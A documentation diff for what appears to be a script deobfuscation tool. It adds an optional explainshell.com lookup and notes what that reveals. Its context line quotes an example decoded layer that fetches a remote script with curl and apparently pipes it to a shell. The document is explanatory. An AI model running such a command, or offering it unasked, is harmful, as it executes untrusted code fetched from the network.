@@ -77,7 +77,9 @@ gives one decoded Bash layer containing `curl -s https://cdn.example.com/a.sh | 
 
 ## Online activity and privacy
 
-Nothing goes online and nothing in the script is executed, resolved or fetched. The script is not saved unless you export or add to a project.
+Nothing goes online unless you click **explainshell.com**, and nothing in the script is executed, resolved or fetched. The script is not saved unless you export or add to a project.
+
+Bash layers have an **explainshell.com** button. After you confirm, it opens your browser at explainshell.com with that layer's text in the URL, so the site sees the command. Use it on one command line at a time, and not on commands that contain secrets or internal names. Layers longer than 4000 characters, or shortened in the view, can't be sent; copy the command you want instead.
 
 ## Export and projects
 
